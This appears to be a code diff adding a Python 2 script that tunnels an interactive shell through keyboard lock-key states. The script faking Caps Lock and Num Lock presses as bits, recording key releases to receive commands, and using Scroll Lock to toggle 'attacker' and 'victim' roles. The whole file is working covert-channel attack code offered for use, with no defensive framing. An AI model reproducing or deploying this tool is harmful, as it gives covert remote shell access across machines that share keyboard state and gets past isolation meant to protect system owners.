@@ -1,0 +1,159 @@
+#!/usr/bin/python
+
+import os
+import pty
+import sys
+import select
+import termios
+import time
+import tty
+from subprocess import Popen
+from Xlib import X, XK, display
+from Xlib.ext import record, xtest
+from Xlib.protocol import rq
+
+if len(sys.argv) > 1:
+  command = sys.argv[1]
+else:
+  command = '/bin/sh'
+
+# open pseudo-terminal to interact with subprocess
+
+master_fd, slave_fd = pty.openpty()
+
+# use os.setsid() make it run in a new process group, or bash job control will not be enabled
+p = Popen(command,
+  shell=True,
+  preexec_fn=os.setsid,
+  stdin=slave_fd,
+  stdout=slave_fd,
+  stderr=slave_fd,
+  universal_newlines=True)
+
+###
+
+loc_dpy = display.Display()
+rec_dpy = display.Display()
+
+def shutdown():
+  # Exit
+  rec_dpy.record_free_context(ctx)
+  sys.exit()
+
+def led_handler(reply):
+  global c
+  global cc
+
+  if reply.category != record.FromServer:
+    return
+  if reply.client_swapped:
+    #print("* received swapped protocol data, cowardly ignored")
+    return
+  if not len(reply.data) or reply.data[0] < 2:
+    # not an event
+    return
+
+  if not len(reply.data):
+    return
+
+  data = reply.data
+  while len(data):
+    event, data = rq.EventField(None).parse_binary_value(data, rec_dpy.display, None, None)
+
+    if event.type == X.KeyRelease:
+      #print event.detail
+
+      # Scroll_Lock - Toggle attacker/victim
+      if event.detail == sl_key:
+        loc_dpy.record_disable_context(ctx)
+        loc_dpy.flush()
+        return
+
+      # Num_Lock - Zero
+      if event.detail == nl_key and cc < 8:
+        cc+=1
+        c>>=1
+      # Caps_Lock - One
+      if event.detail == cl_key and cc < 8:
+        cc+=1
+        c>>=1
+        c+=128
+        # Return..
+
+      # Last bit?
+      if cc >= 8:
+        #sys.stdout.write(chr(c))
+        #sys.stdout.flush()
+        os.write(master_fd, chr(c))
+        c=0
+        cc=0
+        return
+
+      return
+
+#input = open("/dev/stdin", "rb")
+
+c = 0
+cc = 0
+sl_skip = 0
+
+nl_key = rec_dpy.keysym_to_keycode(XK.string_to_keysym('Num_Lock'))
+cl_key = rec_dpy.keysym_to_keycode(XK.string_to_keysym('Caps_Lock'))
+sl_key = rec_dpy.keysym_to_keycode(XK.string_to_keysym('Scroll_Lock'))
+
+nl = 0
+cl = 0
+sl = 0
+
+ctx = rec_dpy.record_create_context(
+  0,
+  [record.AllClients],
+  [{
+    'core_requests': (0, 0),
+    'core_replies': (0, 0),
+    'ext_requests': (0, 0, 0, 0),
+    'ext_replies': (0, 0, 0, 0),
+    'delivered_events': (0, 0),
+    'device_events': (X.KeyPress, X.KeyRelease),
+    'errors': (0, 0),
+    'client_started': False,
+    'client_died': False,
+  }])
+
+while 1:
+  # Will return after a record_disable_context
+  rec_dpy.record_enable_context(ctx, led_handler)
+
+  time.sleep(0.005)
+
+  # Check if process has exited
+  p.poll()
+  if not (p.returncode is None):
+    shutdown()
+
+  # Read a byte from the command if there is one and send it.
+  r, w, e = select.select([ master_fd ], [], [], 0)
+  if master_fd in r:
+    #d = input.read(1) 
+    d = os.read(master_fd, 1)
+
+    c=ord(d)
+    # Send a character
+    for i in xrange(8):
+      if c%2:
+        xtest.fake_input(rec_dpy, X.KeyPress, cl_key)
+        xtest.fake_input(rec_dpy, X.KeyRelease, cl_key)
+      else:
+        xtest.fake_input(rec_dpy, X.KeyPress, nl_key)
+        xtest.fake_input(rec_dpy, X.KeyRelease, nl_key)
+      rec_dpy.sync()
+      c>>=1
+      time.sleep(0.001)
+
+  time.sleep(0.01)
+
+  # Toggle to attacker
+  xtest.fake_input(loc_dpy, X.KeyPress, sl_key)
+  xtest.fake_input(loc_dpy, X.KeyRelease, sl_key)
+  loc_dpy.sync()
+
